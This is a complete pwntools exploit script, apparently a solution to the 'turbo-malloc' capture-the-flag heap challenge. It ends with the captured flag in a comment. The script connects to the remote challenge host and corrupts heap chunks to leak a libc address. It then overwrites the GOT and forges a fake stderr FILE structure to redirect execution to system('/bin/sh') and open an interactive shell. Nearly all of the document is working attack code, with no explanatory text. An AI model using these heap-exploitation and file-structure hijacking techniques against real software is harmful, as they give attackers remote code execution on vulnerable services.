#!/usr/bin/env python3
from pwn import *

context.terminal = ["/usr/bin/kitty"]
context.encoding = 'latin'
context.log_level = "critical"

context.binary = elf = ELF("./pturbo-malloc", checksec=False)
# context.binary = elf = ELF("./src/redis-lite-server", checksec=False)
libc = ELF("./libc.so.6")

gs = """
b die
c
"""

HOST, PORT = "ab6b07be0174f0b9.turbo-malloc.flu.xxx", 1024
# HOST, PORT = "34.170.146.252", 11192

def menu(id: int):
    p.sendlineafter("> ", str(id))

def create_note(idx: int, sz: int):
    menu(1)
    p.sendlineafter("): ", str(idx))
    p.sendlineafter("Size: ", str(sz))

def write_note(idx: int, data: bytes):
    menu(4)
    p.sendlineafter("): ", str(idx))
    p.sendafter("Data: ", data)

def read_note(idx: int):
    menu(3)
    p.sendlineafter("): ", str(idx))

def realloc_note(idx: int, newsz: int):
    menu(5)
    p.sendlineafter("): ", str(idx))
    p.sendlineafter("New size: ", str(newsz))

def remove_note(idx: int):
    menu(2)
    p.sendlineafter("): ", str(idx))

p = remote(HOST, PORT, ssl=True)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gs)

create_note(0, 0x10)
create_note(1, 0x10)
create_note(2, 0x30)
create_note(3, 0x10)
create_note(4, 0x1000)

payload = flat(
    0x1337, 0x1338,
    elf.got["abort"], 0x10,
    0x133b, 0x4242424242424242
)
write_note(2, payload)

# remove_note(3)
remove_note(1)
remove_note(0)

realloc_note(2, 0x10)

create_note(9, 0x10)
create_note(10, 0x10)
create_note(11, 0x10)
create_note(12, 0xb0)

read_note(12)

libc.address = u64(p.recv(0x90)[:8]) - libc.sym['puts']
print(f"libc: {hex(libc.address)}")

# 0x1111e7 posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
# one_gadget = libc.address + 0x1111e7
# one_gadget = 0x6969696969696969
# write_note(10, flat(0, one_gadget))
# write_note(11, flat(0, one_gadget))


# call_drax8 = libc.address + 0x17a5c2 # 0x000000000017a5c2 : sar rdx, 0x20 ; mov qword ptr [rbp - 0x28], rdx ; call qword ptr [rax + 8]
fake_stderr_addr = 0x404170
got_forge = flat(
    libc.sym['puts'],
    libc.sym["write"],
    libc.sym["__stack_chk_fail"],
    libc.sym["setbuf"],
    libc.sym["printf"],
    libc.sym["read"],
    libc.sym["getchar"],
    libc.sym["memcpy"],
    libc.sym["perror"],
    libc.sym["__isoc99_scanf"],
    libc.sym["exit"],
    0, 0, 0,
    libc.sym['_IO_2_1_stdout_'],
    0,
    libc.sym['_IO_2_1_stdin_'],
    0,
    fake_stderr_addr
)


# write_note(11, p64(libc.sym['system']))
write_note(12, got_forge)
# read_note(11)

fake_stderr = FileStructure(null=elf.sym['data_start'])
fake_stderr.flags = 0x2020203bfbad2484
fake_stderr._IO_read_ptr = u64(b"/bin/sh\x00")
fake_stderr.fileno = 3
fake_stderr.vtable = libc.sym['_IO_file_jumps'] + 0x2a0
fake_stderr._wide_data = fake_stderr_addr+len(bytes(fake_stderr))

payload2 = flat(
    0,
    1, 2, 0, 0, 0, 0, 
    {
        0xa8: fake_stderr_addr+len(bytes(fake_stderr)),
        0x30: libc.sym['system']
    }, filler = b'\x00'
)

write_note(4, bytes(fake_stderr) + payload2)
realloc_note(11, 0)

p.interactive()
# flag{4gile_and_f4st_n0t3s_what_m0re_c0uld_you_want_b1cc935ab0c4954dfbc357db7c76a40c}